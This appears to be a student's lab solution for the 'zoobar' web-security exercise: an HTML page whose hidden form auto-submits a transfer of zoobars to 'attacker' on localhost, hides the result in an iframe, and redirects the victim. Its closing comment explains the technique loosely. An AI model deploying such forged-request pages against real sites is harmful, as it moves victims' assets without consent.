@@ -1,0 +1,19 @@
+<form method="POST" name="transferform" action="http://localhost:8080/zoobar/index.cgi/transfer" style='display:none;' target='attacker'>
+    <p>Send <input name="zoobars" type="text" value="10" size=5> zoobars</p>
+    <p>to <input name=recipient type=text value="attacker" size=10></p>
+    <input type="submit" name="submission" value="Send">
+</form>
+<iframe id="iframe" name="attacker" src="" style="display:none"></iframe>
+<script>
+  document.getElementsByName('transferform')[0].submit();
+  var iframe = document.getElementById("iframe");
+  iframe.addEventListener("load", function f () {
+    window.location = "https://www.sutd.edu.sg/"            
+  }, false);
+</script>
+
+<!-- 
+This works because the redirect is passed to the iframe to handle, so the main browser window won't be redirected upon successful submission of the form.
+Same-Site Origin Policy does not apply here because we are submitting the form directly (through the form's action), rather than through JavaScript.
+If we were to use fetch for example, the request would be blocked by the Same-Site Origin Policy. 
+-->
